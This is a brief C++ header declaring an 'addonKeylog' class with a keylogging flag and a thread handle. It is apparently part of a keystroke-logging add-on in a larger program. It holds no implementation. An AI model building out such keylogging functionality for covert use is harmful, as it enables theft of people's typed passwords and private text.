#pragma once

#include "addon.h"





class addonKeylog
{
public:
	bool keylog_active;
	HANDLE keylogThread;

	addonKeylog();
	~addonKeylog();
};